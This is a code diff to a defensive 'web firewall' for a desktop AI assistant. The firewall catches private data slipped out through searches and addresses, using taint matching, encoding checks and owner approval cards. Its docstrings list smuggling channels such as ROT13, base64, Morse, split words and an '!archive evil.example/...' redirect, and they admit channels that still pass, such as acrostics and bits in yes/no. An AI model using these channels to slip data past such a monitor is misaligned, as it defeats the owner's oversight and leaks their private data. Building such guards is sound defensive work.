@@ -7,15 +7,17 @@ never the size of the taint set, which a note holding only short words leaves em
 
     TaintSet(owner_words)        the run's private fragments: add(texts) (agent.owner feeds it from each private tool's
                                  result), note_owner(words), hits(text), split_hits(text, recent), foreign(text),
-                                 oddly_written(text), clear(hits, words)
+                                 oddly_written(text), not_theirs(text), clear(hits, words)
     ReadWords()                  runs of other people's words this run has read: feed(text), holds(line)
     looks_encoded(query)         a query that looks like data rather than words
     decoded_forms(text)          ``text`` and what it decodes to, percent-encoded any number of times
     WebFirewall(book)            policy.Firewall for the web tools:
         attach(ask)              how it asks the owner: the run's ask_web(text, choices, on_answer)
-        owner_said(words)        the owner's words: what is not tainted now never taints, and while the run holds nothing
-                                 private their addresses count as seen; said() gives them back, joined, and messages()
-                                 one by one: the words a licence is read from (agent.owner)
+        owner_said(words, answer=)   the owner's words: what is not tainted now never taints, and while the run holds
+                                 nothing private their addresses count as seen; said() gives them back, joined, and
+                                 messages() one by one: the words a licence is read from (agent.owner); heard() each as
+                                 it was said, its last "?" kept, and whether it answered the model's own question
+                                 (``answer``: agent.runner), which asks for nothing at once
         note_private()           a private tool answered, whatever it fed, or the owner typed words the model had asked for
                                  (agent.runner): the checks are on from now on, for good
         note_if_private(words)   the same when what the owner said plainly holds something private
@@ -24,18 +26,29 @@ never the size of the taint set, which a note holding only short words leaves em
         go_strict()              the run has read a mail's body, a file's contents or the conversation (strict)
         check(tool, args)        before web_search, open_page, fetch_text and open_thing's site: None, or what goes back
                                  to the model instead
+        clicked(name, exact)     the owner's Allow on this call's card let it go just now: once (open_thing: that click
+                                 is its open card's click too, so one site takes one click)
         ask_once(name, exact, text)   the same card, for a change the owner's words don't plainly ask for (pc_control)
         speakable(line)          may this line the model wrote reach the voice? (the app's one gate: agent_ui)
         read_words               the run's ReadWords
 
-The rules. In a clean run searches and public https addresses need no click. Once a private tool has answered,
+The rules. In a clean run searches and public https addresses need no click, but for one: an address not seen whose
+path, query or fragment carries a number of 4 digits or more from the owner's own words (not a year; as itself, reversed
+or with zeros before it, percent-decoded), which waits for the card as an unseen address of a private run does. A word of
+their request in an address the model wrote goes with no click: measured on real runs, words would add several clicks to
+every public task, and numbers none. Once a private tool has answered,
 web_search checks the query's words and open_page must use an address seen in this run (a search result, a link on a
 page read, the owner's words before then), unchanged, checked after percent-decoding, and fetch_text is held to both: its
 address as open_page's, its question's words as a search's; a hit, an unseen address or an encoded-looking query waits for an
-amber card (the owner-question seam, kind "web") that shows the exact words or address, with "Allow" and "Don't". A
-click allows that one call and clears those words for the run. No click, no call: a declined or unanswered call is
-refused in plain words, so the model adapts, and the same call asked again is refused without a second card, whatever
-has been cleared since. While the card is up the same call is told so, with no second card and nothing sent.
+amber card (the owner-question seam, kind "web") that shows the exact words or address, with "Allow" and "Don't". So
+does a search with a word opening with "!" or a backslash: an order to the engine to go elsewhere ("!archive ..."), not
+a search. A click allows that one call and clears for the run the words it showed whole, as they stand in its words or
+its address or are named on its card; a word it never showed (cut across "the rice", reversed, in base64) lets that one
+call go and stays private. No click, no call: a declined or unanswered call is refused in plain words, so the model
+adapts, and the same call asked again is refused without a second card, whatever has been cleared since: a search by
+its words, spaces and capitals aside, and an address by the page it is (ask.research.normalize_url), whichever of
+open_page, fetch_text and open_thing asks for it. While the card is up the same call is told so, with no second card
+and nothing sent.
 
 Typed or spoken words never allow one (agent.runner), and "only a click" holds at every moment, not just while a card is
 up: once a run holds anything private, a later message never clears a word already in the taint set and never makes an
@@ -47,24 +60,35 @@ Strict (part A4, stricter than the spec, because word matching can't cover whole
 run has read a mail's body, a file's contents or the conversation, every search and fetch_text question that holds any
 word outside the owner's own words and COMMON_WORDS (or SHORT_WORDS, the little words of any sentence), or any symbol
 that is not ordinary sentence punctuation (flag letters, Morse, an emoji), goes to the card, and every address must have
-been seen in this run, unchanged. The calendar, contacts, notes and file NAMES only taint. It is the same card and the
-same click: one allow clears only the words it showed, for this run.
+been seen in this run, unchanged. The calendar, contacts, notes and the NAMES of files, apps and saved sites only taint.
+It is the same card and the same click: one allow clears only the words it showed, for this run.
 
 Words are matched as they would read: look-alike letters, accents, invisible characters, cuts and glue aside; reversed,
 in ROT13 and with the usual digits as letters; numbers in any form of digit, phone numbers and long runs, and runs of 4
-to 6 digits but for years, the same numbers reversed or with zeros before them; base64 and hex of four characters and up.
+to 6 digits but for years, the same numbers reversed or with zeros before them (one that starts with a zero only when
+written with one: "0100" is not "100"); base64 and hex of four characters and up. A word under GLUED_MIN letters counts
+across a cut only from one word's start to another's end ("No ra", not "the rice"), and no word counts inside one of the
+owner's own words ("flight" in their "flights").
 
 How a word is written counts as well as how it reads, in any run that holds anything private (TaintSet.oddly_written),
 so accents and marks are no way to carry something on a word that folds to the owner's: a word with anything outside
 ASCII in it that is not spelled so in the owner's own words goes to the card (no table of look-alikes can be whole, and
 a foreign-language query they did not spell takes one click), and so do two or more marks glued to a word, or standing
-alone, that are not theirs. One mark at a time, and brackets or quotes round a word, are ordinary writing.
+alone, that are not theirs. One mark at a time, brackets or quotes round a word, and the runs "...", "?!", "!?", "!!",
+"??", "--" and ".-" are ordinary writing. A token that stands whole as the owner wrote it, or as a search they allowed
+showed it (a tracking number, "samsung-galaxy-s24-ultra"), never reads as encoded.
 
-The honest limit: word matching can't catch what is not written as the word. In a run that is not strict (one that has
-read only the calendar, contacts, notes or file names) a paraphrase, a word with a letter dropped, an amount or a time
+What the model says reaches the voice, which goes to an online service, only while the run holds nothing private; after
+that a line may hold no tainted word, no key, email address or long number of its own (holds_something_private's reads
+but its words for a secret: naming one is not holding one) and, in a strict run, no foreign word.
+
+The honest limit: word matching can't catch what is not written as the word. In a clean run a word of the owner's request
+goes out in an address the model wrote with no card: only their numbers take one. In a run that is not strict (one that
+has read only the calendar, contacts, notes or names) a paraphrase, a word with a letter dropped, an amount or a time
 go out with no card, and a strict run still passes anything spelled in common words (an acrostic, yes and no as bits, a
-letter's case, one mark on a word). A page can offer links whose choice says something (each is an address seen). The
-address rule and the window's having no way to type or post are the strong parts; this is a net under them, not a proof.
+letter's case, one mark on a word, the runs of marks ordinary writing uses). A page can offer links whose choice says
+something (each is an address seen). The address rule and the window's having no way to type or post are the strong
+parts; this is a net under them, not a proof.
 """
 
 from __future__ import annotations
@@ -78,13 +102,14 @@ import unicodedata
 from collections import deque
 from collections.abc import Callable, Iterable, Mapping
 from typing import Any
-from urllib.parse import unquote_plus
+from urllib.parse import unquote_plus, urlsplit
 
 from ..actions import link_host, web_link_problem
+from ..ask.research import normalize_url
 from ..desktop import guard
 from ..format_chars import invisible_char
-from .tools import WAIT_TEXT, Tool, ToolResult, error
-from .web import AddressBook, owner_addresses
+from .tools import FETCH_QUESTION_CAP, WAIT_TEXT, Tool, ToolResult, error
+from .web import QUERY_CAP, AddressBook, owner_addresses
 
 WEB_ALLOW, WEB_DONT = "Allow", "Don't"         # the card's choices; only the first, clicked, allows anything
 WEB_CHOICES = (WEB_ALLOW, WEB_DONT)
@@ -132,6 +157,8 @@ _PHONE_RE = re.compile(r"\+?\d[\d\s().\-/]{5,22}\d")
 _DIGIT_RUN_RE = re.compile(r"\d{%d,}" % DIGIT_RUN_MIN)
 _REQUEST_NUMBER_RE = re.compile(r"(?<!\d)\d{6,}(?!\d)")       # in a request: a code, an account, a reference
 REQUEST_GROUPED_DIGITS = 9       # ... or this many in groups (a card, a phone, an order), which a date never is
+_REQUEST_WORDS = frozenset({"dob"})          # ... or a word that says it holds one: a date of birth
+OWNER_NUMBER_MIN = 4             # digits in a number of the owner's own that a clean run's unseen address may not carry
 _SHORT_NUMBER_RE = re.compile(r"(?<!\d)\d{4,6}(?!\d)")       # a locker code, a PIN, a reference: years left out
 _YEAR_RE = re.compile(r"(?:19|20)\d\d")
 _ANY_DIGITS_RE = re.compile(r"\d+")
@@ -151,7 +178,17 @@ _START_MARKS_RE = re.compile(r"[(\[{'\"\u2018\u201C\u00AB]{2}")
 _END_MARKS_RE = re.compile(r"[)\]}'\"\u2019\u201D\u00BB]{1,2}[.,;:!?]?|[.,;:!?][)\]}'\"\u2019\u201D\u00BB]{1,2}"
                            r"|[^.,;:!?][.,;:!?]|\.[,;:]")
 _MIDDLE_MARKS_RE = re.compile(r"[-/][$\u00A3\u20AC\u00A5]|%[-/]")
+# Runs of marks that are ordinary writing wherever they stand: "deals...", "worth it?!", "U.S.-China", "--".
+_ORDINARY_RUNS = frozenset({"...", "?!", "!?", "!!", "??", "--", ".-"})
 _SENTENCE_ENDS = ".,;:!?"
+# What stands round a token as the owner wrote it and is no part of it ("1Z999AA10123456784?"): TaintSet.not_theirs.
+_TOKEN_EDGES = "\"'()[]{}<>.,;:!?\u2018\u2019\u201C\u201D\u00AB\u00BB"
+_PIECE_RE = re.compile(r"\S+")   # a piece between spaces, as str.split() cuts them
+# A search word opening so is an order to the engine to go elsewhere (DuckDuckGo's "!archive ...", "\site ..."), once
+# any quote or bracket before it is taken away.
+_ENGINE_COMMAND_MARKS = ("!", "\\")
+_OPENERS = "\"'([{\u2018\u201C\u00AB"
+ADDRESS_KEY = "address"          # what a declined open_page, fetch_text or open_thing is known by (_declined_key)
 # Where a text is cut to see how its words are written: spaces, ASCII's marks, a sentence's curly quotes and dashes, and
 # money. None of these is a letter, and a word's own marks are looked at apart (_glued_marks).
 _SPELLING_CUT_RE = re.compile(r"[\s!-/:-@\[-`{-~\u2018\u2019\u201C\u201D\u00AB\u00BB\u2013\u2014"
@@ -283,10 +320,17 @@ def _digits(text: str) -> str:
 
 
 def holds_something_private(words: str) -> bool:
-    """What the owner said plainly holds what must not leave by an address a page names: a key or a word for a secret, an
-    email address, a long number. Only ever turns the checks on (WebFirewall.note_if_private)."""
+    """What the owner said plainly holds what must not leave by an address a page names: a key or a word for a secret
+    ("DOB" too), an email address, a long number. Only ever turns the checks on (WebFirewall.note_if_private)."""
     plain = _ascii_digits(words or "")
-    return (guard.holds_secret(plain) or guard.asks_for_secret(plain) or _EMAIL_RE.search(plain) is not None
+    return (guard.asks_for_secret(plain) or _holds_data(plain)
+            or not _REQUEST_WORDS.isdisjoint(_tokens(_fold(plain))))
+
+
+def _holds_data(plain: str) -> bool:
+    """``plain`` (its digits plain) itself holds a key, an email address or a long number: holds_something_private's
+    reads but its words for a secret, for naming a secret is not holding one (WebFirewall.speakable)."""
+    return (guard.holds_secret(plain) or _EMAIL_RE.search(plain) is not None
             or _REQUEST_NUMBER_RE.search(plain) is not None
             or any(len(_digits(found)) >= REQUEST_GROUPED_DIGITS for found in _PHONE_RE.findall(plain)))
 
@@ -314,14 +358,15 @@ def _other_readings(tokens: Iterable[str]) -> set[str]:
 
 def _glued_marks(folded: str) -> set[str]:
     """Marks that write something, in any run that holds anything private: two or more in a row glued to a word
-    ("laptops--.-..-", "laptops.,.,"), or standing alone ("--.-", "..."). One mark at a time is ordinary writing
-    ("well-known", "U.S.", "site:example.com"), and so are brackets or quotes round a word and a sentence's own mark at
-    its end (_START_MARKS_RE, _END_MARKS_RE, _MIDDLE_MARKS_RE)."""
+    ("laptops--.-..-", "laptops.,.,"), or standing alone ("--.-", "...."). One mark at a time is ordinary writing
+    ("well-known", "U.S.", "site:example.com"), and so are brackets or quotes round a word, a sentence's own mark at
+    its end (_START_MARKS_RE, _END_MARKS_RE, _MIDDLE_MARKS_RE) and, wherever they stand, the runs of _ORDINARY_RUNS
+    ("deals...", "worth it?!", "U.S.-China", "--")."""
     found: set[str] = set()
     for part in folded.split():
         for run in _MARK_RUN_RE.finditer(part):
             marks = run.group()
-            if len(marks) < 2:
+            if len(marks) < 2 or marks in _ORDINARY_RUNS:
                 continue
             if run.start() == 0 and run.end() == len(part):
                 found.add(marks)
@@ -338,12 +383,12 @@ def _glued_marks(folded: str) -> set[str]:
 
 def _marks(folded: str) -> set[str]:
     """What a strict run counts as a word though it holds no letter or digit: a run of symbols anywhere (flag letters,
-    an emoji, "+"), whatever stands alone with no letter in it (Morse, "...", "-") but one ordinary sentence mark, and
-    marks glued to a word (_glued_marks)."""
+    an emoji, "+"), whatever stands alone with no letter in it (Morse, "....", "-") but one ordinary sentence mark or a
+    run of _ORDINARY_RUNS ("--", "..."), and marks glued to a word (_glued_marks)."""
     found = _glued_marks(folded)
     for part in folded.split():
         if not any(char.isalnum() for char in part):
-            if len(part) > 1 or part not in _SENTENCE_MARKS:
+            if (len(part) > 1 or part not in _SENTENCE_MARKS) and part not in _ORDINARY_RUNS:
                 found.add(part)
             continue
         run = ""
@@ -385,6 +430,69 @@ def _crosses(joined: str, word: str, cuts: set[int]) -> bool:
             return True
         start = joined.find(word, start + 1)
     return False
+
+
+def _inside(text: str, word: str, glued: bool, starts: set[int], ends: set[int], theirs: list[tuple[int, int]],
+            backwards: bool = False) -> bool:
+    """``word`` stands in ``text``, a call's tokens run together (or that reversed: ``backwards``), other than inside
+    one of the owner's own tokens (``theirs``: their spans): anywhere when ``glued`` (GLUED_MIN+ letters), else only
+    from one token's start to another's end ("no ra", "s a m", never "the rice"). ``starts``, ``ends``: where tokens
+    start and end."""
+    size = len(text)
+    at = text.find(word)
+    while at >= 0:
+        first, last = (size - at - len(word), size - at) if backwards else (at, at + len(word))
+        if not any(start <= first and last <= end for start, end in theirs) \
+                and (glued or (first in starts and last in ends)):
+            return True
+        at = text.find(word, at + 1)
+    return False
+
+
+def _whole_token(piece: str) -> str:
+    """A piece of a text between spaces as a token is compared whole (TaintSet.not_theirs): one case, with the quotes,
+    brackets and sentence marks round it gone."""
+    return piece.strip(_TOKEN_EDGES).casefold()
+
+
+def _engine_command(query: str) -> bool:
+    """A word of ``query`` opens with "!" or a backslash, once any quote or bracket before it is gone: an order to the
+    engine to go elsewhere ("!archive evil.example/c/493021", "\\site ..."), not a search."""
+    return any(word.lstrip(_OPENERS).startswith(_ENGINE_COMMAND_MARKS) for word in query.split())
+
+
+def _after_host(address: str) -> str:
+    """What ``address`` carries after its host: its path, query and fragment (a page reads its fragment too)."""
+    try:
+        parts = urlsplit(address)
+    except ValueError:
+        return address
+    query = f"?{parts.query}" if parts.query else ""
+    return parts.path + query + (f"#{parts.fragment}" if parts.fragment else "")
+
+
+def _declined_key(call: tuple[str, str]) -> tuple[str, str]:
+    """What a declined call is known by, so it never comes back in another form: a search by its words, spaces and
+    capitals aside (the tool sends them collapsed), and an address by the page it is (ask.research.normalize_url),
+    whichever of open_page, fetch_text and open_thing asked for it. Any other call (pc_control) as it is."""
+    name, exact = call
+    if name == "web_search":
+        return name, " ".join(exact.split()).casefold()
+    if name in ("open_page", "open_thing", "fetch_text"):
+        return ADDRESS_KEY, normalize_url(exact.partition(FETCH_JOIN)[0])
+    return call
+
+
+def _shown_whole(card: str, exact: str, hits: tuple[str, ...]) -> tuple[str, ...]:
+    """Of ``hits``, the ones that stand whole in what the card showed, which its Allow clears: a word, a number, an email
+    address or a mark as it stands in the exact words or address, or a word an address's card names first. A word the
+    card never showed (cut across "the rice", reversed, in base64, split across calls) is none of them."""
+    named = set(hits[:CARRIES_SHOWN]) if card != SEARCH_CARD else set()
+    plain = _ascii_digits(exact if exact.isascii() else unicodedata.normalize("NFKD", exact))
+    folded = _fold(plain)
+    whole = (set(_tokens(folded)) | _marks(folded) | set(_ANY_DIGITS_RE.findall(plain))
+             | {_fold(found) for found in _EMAIL_RE.findall(plain)})
+    return tuple(hit for hit in hits if hit in whole or hit in named)
 
 
 def looks_encoded(query: str, letters: bool = True) -> bool:
@@ -432,6 +540,7 @@ class TaintSet:
         self._phones: set[str] = set()
         self._numbers: set[str] = set()      # runs of 4 to 6 digits, matched only as whole numbers
         self._spelling = ""                  # how the owner wrote what is not ASCII (oddly_written)
+        self._whole: set[str] = set()        # tokens as the owner wrote them or an allowed search showed them (not_theirs)
         if owner_words:
             self.note_owner(owner_words)
 
@@ -456,10 +565,12 @@ class TaintSet:
         emails = {_fold(found) for found in _EMAIL_RE.findall(plain)}
         phones = {_digits(found) for found in _PHONE_RE.findall(plain)}
         spelled = "".join(f"{piece}\n" for piece in _spelled(words))
+        whole = {_whole_token(piece) for piece in (words or "").split()} - {""}
         with self._lock:
             self._owner |= ((tokens - self._words - self._phones - self._numbers) | (emails - self._emails)
                             | (phones - self._phones) | _marks(folded))
             self._spelling += spelled
+            self._whole |= whole
 
     def add(self, fragments: Iterable[str]) -> int:
         """Text from a private tool's result: its addresses, its phone numbers and other runs of digits (years left
@@ -497,13 +608,15 @@ class TaintSet:
 
     def hits(self, text: str) -> tuple[str, ...]:
         """The fragments ``text`` carries, as itself or percent-decoded any number of times. A word counts as a word of
-        its own, across the pieces it was cut into ("Sam antha", "s-a-m-a-n-t-h-a"), when GLUED_MIN+ letters long inside
-        a longer one, and read reversed, in ROT13 or with digits for letters. A number in any form of digit: a phone
-        number or a long run as _number_in says, a run of 4 to 6 digits as a whole number."""
+        its own, across the pieces it was cut into ("Sam antha", "s-a-m-a-n-t-h-a": a word under GLUED_MIN letters only
+        from one piece's start to another's end), when GLUED_MIN+ letters long inside a longer one, and read reversed,
+        in ROT13 or with digits for letters; never inside one of the owner's own words. A number in any form of digit: a
+        phone number or a long run as _number_in says, a run of 4 to 6 digits as a whole number."""
         found: set[str] = set()
         with self._lock:
             words, emails = set(self._words), set(self._emails)
             phones, numbers = set(self._phones), set(self._numbers)
+            owner = frozenset(self._owner)
         if not (words or emails or phones or numbers):
             return ()
         decoded = decoded_forms(text or "")
@@ -515,10 +628,13 @@ class TaintSet:
             folded = _fold(form)
             tokens = _tokens(folded)
             joined = "".join(tokens)
-            cuts, at = set(), 0
-            for token in tokens[:-1]:
+            starts, ends, theirs, at = set(), set(), [], 0
+            for token in tokens:
+                starts.add(at)
+                if token in owner:
+                    theirs.append((at, at + len(token)))
                 at += len(token)
-                cuts.add(at)
+                ends.add(at)
             digits = _digits(form)
             found |= {email for email in emails if email in folded}
             found |= {phone for phone in phones if _number_in(phone, digits) or _number_in(phone, digits[::-1])}
@@ -526,8 +642,10 @@ class TaintSet:
             present = set(tokens) | _other_readings(tokens)
             others = (joined[::-1], joined.translate(_ROT13))
             for word in words:
-                if word in present or (word in joined and (len(word) >= GLUED_MIN or _crosses(joined, word, cuts))) \
-                        or (len(word) >= GLUED_MIN and (word in others[0] or word in others[1])):
+                glued = len(word) >= GLUED_MIN
+                if word in present or (word in joined and _inside(joined, word, glued, starts, ends, theirs)) \
+                        or (glued and word in others[0] and _inside(others[0], word, True, starts, ends, theirs, True)) \
+                        or (glued and word in others[1] and _inside(others[1], word, True, starts, ends, theirs)):
                     found.add(word)
         return tuple(sorted(found))
 
@@ -556,6 +674,14 @@ class TaintSet:
             return True
         return bool(_glued_marks(_fold(text or "")) - owner)
 
+    def not_theirs(self, text: str) -> str:
+        """``text`` without the tokens that stand whole as the owner wrote them, or as a search they allowed showed them:
+        what looks_encoded reads, for their own tracking number or "samsung-galaxy-s24-ultra" is no data in disguise.
+        What stands between the tokens stays as it was."""
+        with self._lock:
+            whole = frozenset(self._whole)
+        return _PIECE_RE.sub(lambda piece: "" if _whole_token(piece.group()) in whole else piece.group(), text or "")
+
     def split_hits(self, text: str, recent: Iterable[str]) -> tuple[str, ...]:
         """The words of SPLIT_MIN+ letters that ``text`` completes with the calls before it: in a row, or any one of
         them and this one, either way round."""
@@ -581,21 +707,24 @@ class TaintSet:
 
     def pieced_hits(self, text: str, recent: Iterable[Iterable[str]]) -> tuple[str, ...]:
         """The words of SPLIT_MIN+ letters that ``text``'s words complete with the words of the calls before it,
-        whatever stood between them ("Zephy news", then "rine news"). ``recent``: those calls' words."""
+        whatever stood between them ("Zephy news", then "rine news"). ``recent``: those calls' words. The little words
+        of any sentence (SHORT_WORDS) are no pieces: "in", "do" and "or" make no "indoor"."""
         with self._lock:
             words = {word for word in self._words if SPLIT_MIN <= len(word) <= SPLIT_MAX}
-        now = {token for token in call_words(text) if len(token) >= PIECE_MIN}
+        now = {token for token in call_words(text) if len(token) >= PIECE_MIN and token not in SHORT_WORDS}
         if not words or not now:
             return ()
-        pieces = now | {token for call in recent for token in call if len(token) >= PIECE_MIN}
+        pieces = now | {token for call in recent for token in call
+                        if len(token) >= PIECE_MIN and token not in SHORT_WORDS}
         return tuple(sorted(word for word in words if _pieced(word, pieces, now)))
 
     def clear(self, fragments: Iterable[str], words: str = "") -> None:
         """The owner allowed these words to go out: they no longer count, for the rest of the run. ``words``: as they were
-        written on the card that was allowed (oddly_written)."""
+        written on the card that was allowed (oddly_written), its tokens whole from now on the owner's (not_theirs)."""
         gone = set(fragments)
         spelled = "".join(f"{piece}\n" for piece in _spelled(words))
         marks = _glued_marks(_fold(words))
+        whole = {_whole_token(piece) for piece in (words or "").split()} - {""}
         with self._lock:
             self._words -= gone
             self._emails -= gone
@@ -603,6 +732,7 @@ class TaintSet:
             self._numbers -= gone
             self._owner |= gone | marks
             self._spelling += spelled
+            self._whole |= whole
 
 
 class ReadWords:
@@ -670,10 +800,13 @@ def _number_in(number: str, digits: str) -> bool:
 
 
 def _numbers_in(numbers: set[str], runs: set[str]) -> set[str]:
-    """Which of ``numbers`` (runs of 4 to 6 digits) ``runs`` write: as themselves, reversed, or with zeros before them."""
+    """Which of ``numbers`` ``runs`` write: as themselves, reversed, or with zeros before them; one that starts with a
+    zero only by a run that has a zero before it too ("0100" is not the "100" of "under 100 dollars")."""
     readings = runs | {run[::-1] for run in runs}
     plain = {reading.lstrip("0") for reading in readings}
-    return {number for number in numbers if number in readings or (number.lstrip("0") or number) in plain}
+    led = {reading.lstrip("0") for reading in readings if reading.startswith("0")}
+    return {number for number in numbers if number in readings
+            or (number.lstrip("0") or number) in (led if number.startswith("0") else plain)}
 
 
 def _joined(text: str) -> str:
@@ -710,10 +843,13 @@ class WebFirewall:
         self._recent: deque[str] = deque(maxlen=RECENT_CALLS)
         self._recent_words: deque[tuple[str, ...]] = deque(maxlen=RECENT_CALLS)
         self._allowed: set[tuple[str, str]] = set()
-        self._refused: set[tuple[str, str]] = set()
+        self._refused: set[tuple[str, str]] = set()     # by _declined_key
         self._waiting: set[tuple[str, str]] = set()     # the call on a card that is up, from _shown to _answered
+        self._clicked: set[tuple[str, str]] = set()     # an open_thing whose Allow let it go just now (clicked)
         self._said: list[str] = []
+        self._heard: list[tuple[str, bool]] = []        # the same as said, marks kept, and whether it answered (heard)
         self._wrote: set[str] = set()                   # the addresses in the owner's own words (owner_wrote)
+        self._numbers: set[str] = set()                 # their numbers of OWNER_NUMBER_MIN+ digits but years (fw-2)
         self.private = False
         self.strict = False
         self.cards = 0
@@ -751,11 +887,20 @@ class WebFirewall:
         with self._lock:
             return tuple(self._said)
 
+    def heard(self) -> tuple[tuple[str, bool], ...]:
+        """The same messages as they were said, spaces collapsed and their last "?" kept (a question asks for nothing at
+        once: agent.owner), each with whether it answered the model's own question (ask_owner)."""
+        with self._lock:
+            return tuple(self._heard)
+
     def speakable(self, line: str) -> bool:
         """May a line the model wrote reach the voice, which goes to Microsoft's online service? Yes while the run holds
-        nothing private; after that only with no tainted word in it and, in a strict run, no foreign word."""
+        nothing private; after that only with no tainted word in it, no key, email address or long number of its own
+        (whoever gave it: the request, a typed answer) and, in a strict run, no foreign word."""
         if not (self.private or self.strict):
             return True
+        if _holds_data(_ascii_digits(line or "")):
+            return False
         return not self.taint.hits(line) and not (self.strict and self.taint.foreign(line))
 
     def attach(self, ask: Callable[[str, tuple[str, ...], Callable[[bool], None]], bool]) -> None:
@@ -763,16 +908,21 @@ class WebFirewall:
         and tells ``on_answer(allowed)`` of the owner's click, or False when no answer came."""
         self._ask = ask
 
-    def owner_said(self, words: str) -> None:
-        """Their words, whenever they come: for said() and messages(), and on their list as note_owner says. An address
-        in them counts as seen only while the run holds nothing private: after that, as a word already tainted, it goes
-        to a card, and a click answers it. Typed or spoken words never do, whatever the sentence says."""
+    def owner_said(self, words: str, *, answer: bool = False) -> None:
+        """Their words, whenever they come: for said(), messages() and heard(), and on their list as note_owner says.
+        ``answer``: they answered the model's own question (agent.runner), so they ask for nothing at once (heard). An
+        address in them counts as seen only while the run holds nothing private: after that, as a word already tainted,
+        it goes to a card, and a click answers it. Typed or spoken words never do, whatever the sentence says."""
         self.taint.note_owner(words)
         addresses = owner_addresses(words)
+        numbers = {found for found in _digit_runs(words or "")
+                   if len(found) >= OWNER_NUMBER_MIN and not _YEAR_RE.fullmatch(found)}
         with self._lock:
             if words:
                 self._said.append(" ".join(words.split()).rstrip(" .!?"))
+                self._heard.append((" ".join(words.split()), bool(answer)))
             self._wrote.update(addresses)
+            self._numbers |= numbers
         if self.private or self.strict:
             return
         for address in addresses:
@@ -786,10 +936,13 @@ class WebFirewall:
 
     def _outgoing(self, tool: Tool, args: Mapping[str, Any]) -> tuple[str, str]:
         """(its card's words, exactly what would go out) of a call the firewall looks at, or ("", "") when none would
-        go: a call with bad input is refused by the tool itself."""
+        go: a call with bad input is refused by the tool itself, one past its cap too, and is never read here: its words
+        could hold this lock, and the owner's next words with it, for as long as it takes to read them."""
         if tool.name == "web_search":
             query = args.get("query")
-            return (SEARCH_CARD, query) if isinstance(query, str) and query.strip() else ("", "")
+            if isinstance(query, str) and query.strip() and len(query) <= QUERY_CAP:
+                return SEARCH_CARD, query
+            return "", ""
         if tool.name == "open_page":
             address = args.get("url") if "number" not in args else self.book.address(args.get("number"))
             if isinstance(address, str) and address and not web_link_problem(address):
@@ -797,7 +950,7 @@ class WebFirewall:
         if tool.name == "fetch_text":
             address, question = args.get("url"), args.get("question")
             if isinstance(address, str) and isinstance(question, str) and question.strip() \
-                    and not web_link_problem(address):
+                    and len(question) <= FETCH_QUESTION_CAP and not web_link_problem(address):
                 return FETCH_CARD, f"{address}{FETCH_JOIN}{' '.join(question.split())}"
         if tool.name == "open_thing":         # a site, under open_page's rules; a ref leaves this PC for nothing
             address = args.get("site")
@@ -812,21 +965,48 @@ class WebFirewall:
             return None
         call = (tool.name, exact)
         with self._lock:
-            if call in self._refused:          # first and always: nothing cleared since brings a declined call back
+            if _declined_key(call) in self._refused:   # first and always: nothing cleared since brings it back
                 return error(REFUSED_TEXT, DECLINED)
             if call in self._waiting:          # its card is up: only a click on it answers it, whatever is seen since
                 return _busy()
             hits = None
-            if self.private or self.strict:
-                if call in self._allowed:
-                    self._allowed.discard(call)
-                else:
-                    hits = self._problem(tool, exact)
+            if call in self._allowed:          # its card's Allow: this one call goes
+                self._allowed.discard(call)
+                if tool.name == "open_thing":
+                    self._clicked.add(call)
+            elif self.private or self.strict:
+                hits = self._problem(tool, exact)
+            else:
+                hits = self._carries_their_number(tool, exact)
             if hits is None:
                 self._recent.append(_joined(exact))
                 self._recent_words.append(call_words(exact))
                 return None
         return self._card(card, call, hits)
+
+    def clicked(self, name: str, exact: Any) -> bool:
+        """The owner's Allow on the card of this call (open_thing's site) let it go just now: True once, so the card that
+        would come next takes that click as its own (one click for one site), never twice."""
+        call = (name, exact)
+        with self._lock:
+            if call in self._clicked:
+                self._clicked.discard(call)
+                return True
+        return False
+
+    def _carries_their_number(self, tool: Tool, exact: str) -> tuple[str, ...] | None:
+        """A clean run's one check: an address not seen whose path, query or fragment carries a number of the owner's own
+        (OWNER_NUMBER_MIN+ digits, not a year), as itself, reversed or with zeros before it, decoded. Those numbers, for
+        its card to name; or None: it may go. Words of theirs are left (the module docs' honest limit)."""
+        if tool.name == "web_search" or not self._numbers:
+            return None
+        address = exact.partition(FETCH_JOIN)[0]
+        if self.book.seen(address):
+            return None
+        runs: set[str] = set()
+        for form in decoded_forms(_after_host(address)):
+            runs |= _digit_runs(form)
+        return tuple(sorted(_numbers_in(self._numbers, runs))) or None
 
     def ask_once(self, name: str, exact: str, text: str) -> ToolResult | None:
         """A change the owner's words don't plainly ask for (agent.owner's pc_control), on the same card under the same
@@ -834,7 +1014,7 @@ class WebFirewall:
         call they declined. ``text``: Jarvis's own words for what it would do."""
         call = (name, exact)
         with self._lock:
-            if call in self._refused:
+            if _declined_key(call) in self._refused:
                 return error(REFUSED_TEXT, DECLINED)
             if call in self._allowed:
                 self._allowed.discard(call)
@@ -851,25 +1031,25 @@ class WebFirewall:
         if hits:
             return tuple(sorted(hits))
         if tool.name == "web_search":
-            return () if self._reads_odd(exact) else None
+            return () if self._reads_odd(exact) or _engine_command(exact) else None
         if tool.name == "fetch_text":         # the address as open_page's, the question's words as a search's
             address, _join, question = exact.partition(FETCH_JOIN)
             return () if self._reads_odd(question) or not self.book.seen(address) else None
         return () if not self.book.seen(exact) else None
 
     def _reads_odd(self, words: str) -> bool:
-        return looks_encoded(words, letters=False) or self.taint.oddly_written(words)
+        return looks_encoded(self.taint.not_theirs(words), letters=False) or self.taint.oddly_written(words)
 
     def _card(self, card: str, call: tuple[str, str], hits: tuple[str, ...]) -> ToolResult:
-        return self._shown(_card_words(card, call[1], hits), call, hits)
+        return self._shown(_card_words(card, call[1], hits), call, _shown_whole(card, call[1], hits))
 
-    def _shown(self, text: str, call: tuple[str, str], hits: tuple[str, ...]) -> ToolResult:
+    def _shown(self, text: str, call: tuple[str, str], shown: tuple[str, ...]) -> ToolResult:
         with self._lock:
             if call in self._waiting:
                 return _busy()
             self._waiting.add(call)
         ask = self._ask
-        if ask is None or not ask(text, WEB_CHOICES, lambda allowed: self._answered(call, hits, allowed)):
+        if ask is None or not ask(text, WEB_CHOICES, lambda allowed: self._answered(call, shown, allowed)):
             with self._lock:
                 self._waiting.discard(call)
             return _busy()
@@ -877,16 +1057,17 @@ class WebFirewall:
             self.cards += 1
         return ToolResult(WAIT_TEXT, code=WAITING, note=WAITING_NOTE, fields=(("Asked you", text),))
 
-    def _answered(self, call: tuple[str, str], hits: tuple[str, ...], allowed: bool) -> None:
-        """Allowed: that one call may go, once, and its words no longer count. Not: it never goes."""
